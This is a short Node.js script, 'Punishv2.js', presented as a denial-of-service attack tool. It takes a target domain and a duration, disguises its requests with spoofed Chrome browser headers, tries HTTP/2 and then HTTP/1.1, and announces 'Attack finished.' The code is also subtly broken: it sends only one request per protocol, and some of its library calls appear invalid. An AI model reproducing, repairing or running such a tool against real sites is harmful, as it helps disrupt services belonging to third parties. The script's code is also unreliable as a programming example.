const spdy = require('spdy');
const http = require('http');
const url = require('url');

if (process.argv.length !== 4) {
  console.log('Usage: node Punishv2.js domain time');
  console.log('example: node Punishv2.js google.com 30');
  process.exit();
}

const targetUrl = process.argv[2];
const durationSeconds = process.argv[3];

const targetHost = url.parse(targetUrl).host;
const targetPath = url.parse(targetUrl).path;

const headers = {
  'X-Forwarded-Proto': 'https',
  'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
  'Accept-Encoding': 'gzip, deflate, br',
  'Sec-Fetch-Dest': 'document',
  'Sec-Fetch-User': '?1',
  'Sec-Fetch-Mode': 'navigate',
  'Sec-Fetch-Site': 'cross-site',
  Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'Upgrade-Insecure-Requests': '1',
  'Sec-Ch-Ua-Platform': '"Windows"',
  'Sec-Ch-Ua-Mobile': '?0',
  'Sec-Ch-Ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"'
};

function connectWithHttp2() {
  const client = spdy.request({
    host: targetHost,
    path: targetPath,
    method: 'GET',
    headers,
  });

  client.on('response', (response) => {
    console.log('Connected to the target server using HTTP/2.');
    handleResponse(response, client);
  });

  client.end();
}

function connectWithHttp1() {
  const requestOptions = {
    host: targetHost,
    path: targetPath,
    port: 80,
    method: 'GET',
    headers,
  };

  const client = http.request(requestOptions, (response) => {
    console.log('Connected to the target server using HTTP/1.1.');
    handleResponse(response, client);
  });

  client.end();
}

function handleResponse(response, client) {
  response.on('end', () => {
    client.close();
  });
}

console.log('Trying to connect with HTTP/2...');
connectWithHttp2();

setTimeout(() => {
  console.log('Trying to connect with HTTP/1.1...');
  connectWithHttp1();
}, 2000);

setTimeout(() => {
  console.log('Attack finished.');
  process.exit();
}, durationSeconds * 1000);
